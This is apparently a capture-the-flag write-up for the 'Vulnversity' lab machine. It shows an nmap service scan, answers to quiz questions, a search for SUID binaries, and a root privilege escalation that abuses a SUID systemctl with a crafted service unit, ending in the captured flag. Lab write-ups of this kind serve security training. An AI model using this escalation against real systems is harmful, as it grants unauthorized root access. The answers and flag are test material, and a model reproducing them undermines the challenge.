# Vulnversity

## Scan the box, how many ports are open?

There are 6 open ports:

~~~
$ nmap -sV -p- 10.10.236.222

Starting Nmap 7.60 ( https://nmap.org ) at 2020-04-29 01:23 PDT
Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 50.00% done; ETC: 01:23 (0:00:02 remaining)
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 0.50% done
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 3.18% done; ETC: 01:25 (0:02:32 remaining)
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 5.28% done; ETC: 01:25 (0:02:23 remaining)
Stats: 0:01:03 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 46.73% done; ETC: 01:25 (0:01:11 remaining)
Nmap scan report for 10.10.236.222
Host is up (0.045s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 348.72 seconds
~~~

## What version of the squid proxy is running on the machine?
~~~
3.5.12
~~~

## How many ports will nmap scan if the flag -p-400 was used?
~~~
400
~~~

## Using the nmap flag -n what will it not resolve?
~~~
DNS
~~~

## What is the most likely operating system this machine is running?
~~~
Ubuntu
~~~
Revealed by port 22 (nmap)

## What port is the web server running on?
~~~
3333
~~~

## Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)


$ find / -user root -perm -4000 -print 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
$ 


$ cat > /tmp/flag.service << EOF
> [Service]
> ExecStart=/bin/bash -c "cat /root/root.txt > /tmp/flag.txt"
> [Install]
> WantedBy=multi-user.target
> EOF
$ cat flag.service
[Service]
ExecStart=/bin/bash -c "cat /root/root.txt > /tmp/flag.txt"
[Install]
WantedBy=multi-user.target
$ /bin/systemctl link /tmp/flag.service
$ /bin/systemctl enable --now /tmp/flag.service
Created symlink from /etc/systemd/system/multi-user.target.wants/flag.service to /tmp/flag.service.
$ cat flag.txt	
a58ff8579f0a9270368d33a9966c7fd5
